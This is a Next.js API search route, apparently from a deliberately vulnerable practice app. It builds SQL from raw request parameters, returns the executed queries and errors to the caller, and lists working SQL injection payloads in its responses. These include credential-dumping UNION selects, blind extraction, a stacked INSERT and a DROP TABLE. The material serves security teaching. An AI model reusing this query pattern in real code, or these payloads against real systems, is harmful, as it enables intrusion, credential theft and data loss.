import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';
import { initDatabase, executeQuery } from '@/lib/database';

export async function GET(request: NextRequest) {
  try {
    await initDatabase();
    const { searchParams } = new URL(request.url);
    const q = searchParams.get('q') || '';
    const table = searchParams.get('table') || 'products';
    const limit = searchParams.get('limit') || '10';
    const column = searchParams.get('column') || 'name';
    const orderBy = searchParams.get('orderBy') || 'name';

    const sqlQuery = `SELECT * FROM ${table} WHERE ${column} LIKE '%${q}%' ORDER BY ${orderBy} LIMIT ${limit}`;
    console.log('Executing advanced search query:', sqlQuery);

    const results = await executeQuery(sqlQuery);

    return NextResponse.json({
      success: true,
      results,
      query: sqlQuery,
      searchTerm: q,
      vulnerabilities: {
        union_based: "Try q: laptop' UNION SELECT id,username,password,email FROM users--",
        boolean_based: "Try q: ' OR (SELECT COUNT(*) FROM users WHERE role='admin')>0--",
        time_based: "Try q: ' OR (SELECT SLEEP(5))--",
        error_based: "Try q: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e))--",
        table_injection: "Try table: users WHERE 1=1--",
        column_injection: "Try column: name WHERE 1=1 UNION SELECT password FROM users--",
        order_by_injection: "Try orderBy: (SELECT CASE WHEN (SELECT password FROM users WHERE username='admin') LIKE 'a%' THEN name ELSE price END)",
        limit_injection: "Try limit: 1 UNION SELECT username,password,email,role FROM users--"
      }
    });
  } catch (error: any) {
    const { searchParams } = new URL(request.url);
    return NextResponse.json({
      success: false,
      message: 'Search failed',
      error: error.message,
      query: `SELECT * FROM ${searchParams.get('table') || 'products'} WHERE ${searchParams.get('column') || 'name'} LIKE '%${searchParams.get('q') || ''}%' ORDER BY ${searchParams.get('orderBy') || 'name'} LIMIT ${searchParams.get('limit') || '10'}`
    }, { status: 500 });
  }
}

export async function POST(request: NextRequest) {
  try {
    await initDatabase();
    const { searchTerm, tableName = 'products', filterBy, orderBy, customWhere } = await request.json();

    let sqlQuery;

    if (customWhere) {
      sqlQuery = `SELECT * FROM ${tableName} WHERE ${customWhere}`;
    } else if (filterBy && orderBy) {
      sqlQuery = `SELECT * FROM ${tableName} WHERE ${filterBy} ORDER BY ${orderBy}`;
    } else {
      sqlQuery = `SELECT * FROM ${tableName} WHERE name = '${searchTerm}' OR description = '${searchTerm}'`;
    }

    console.log('Executing POST search query:', sqlQuery);
    const results = await executeQuery(sqlQuery);

    return NextResponse.json({
      success: true,
      results,
      query: sqlQuery,
      vulnerabilities: {
        filter_injection: "Try filterBy: 1=1; DROP TABLE products--",
        stacked_queries: "Try customWhere: 1=1; INSERT INTO comments (post_id,author_name,content) VALUES (1,'Hacker','Injected via SQL')--",
        blind_sqli: "Try customWhere: 1=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'",
        union_select: "Try tableName: products UNION SELECT username,password,email,role FROM users--",
        information_schema: "Try customWhere: 1=1 UNION SELECT table_name,column_name,data_type,null FROM information_schema.columns--"
      }
    });
  } catch (error: any) {
    return NextResponse.json({
      success: false,
      message: 'Dynamic search failed',
      error: error.message
    }, { status: 500 });
  }
}